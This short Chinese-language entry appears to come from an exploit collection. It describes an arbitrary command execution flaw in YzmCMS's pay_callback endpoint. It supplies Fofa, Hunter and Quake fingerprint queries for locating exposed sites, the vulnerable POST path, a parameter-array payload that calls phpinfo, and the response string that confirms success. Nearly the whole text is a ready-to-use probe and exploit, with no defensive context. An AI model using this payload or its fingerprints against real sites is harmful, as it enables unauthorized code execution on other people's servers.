# YzmCMSpay_callback任意命令执行

YzmCMSpay ｜ 命令执行 ｜ —
- **指纹**：`Fofa:app="yzmcms"或Hunter:app.name="YzmCMS"或Quake：app:"yzmcms"`
- **请求**：`POST /pay/index/pay_callback.html HTTP/1.1`

**Payload**
```
out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```
- **响应特征**：200 php.ini